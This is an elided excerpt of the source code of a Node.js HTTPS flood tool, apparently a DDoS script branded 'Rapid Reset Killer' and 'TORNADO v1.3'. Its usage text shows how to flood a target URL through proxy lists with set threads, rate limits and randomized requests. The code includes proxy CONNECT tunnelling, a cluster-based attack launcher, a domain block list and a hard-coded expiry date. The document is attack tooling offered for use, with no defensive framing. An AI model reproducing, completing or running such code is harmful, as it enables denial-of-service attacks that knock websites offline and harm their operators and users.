// made by t.me/bolongyn aka mitigations for mesh botnet
...
const blockedDomain = [".gov", ".edu", ".edu.vn"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2024-09-30');
...
const ratelimit = process.argv[7];
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error('Rapid Reset Killer - HTTPS FLOOD || t.me/bolongyn');
    console.error(`
    Usage: 
        node ${process.argv[1]} <GET/POST/HEAD/OPTIONS> <target> <port> <time> <threads> <ratelimit> <proxy> <options>
    Example:
        node ${process.argv[1]} GET "https://example.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    `);
    console.error(`
    Options:
...
if (currentDate > targetDate) {
    console.error('Method out of date contact: t.me/bolongyn');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked by t.me/bolongyn`);
    process.exit(1);
}
...
if (!target.startsWith('https://')) {
    console.error('Protocol start at https://');
    process.exit(1);
}
...
function go() {
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        ...
        netSocket.write(`CONNECT ${url.host}:${port} HTTP/1.1\r\nHost: ${url.host}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
...
if (cluster.isMaster) {
    ...
    console.log(`Attack Start / t.me/bolongyn love you <3 / TORNADO v1.3`);
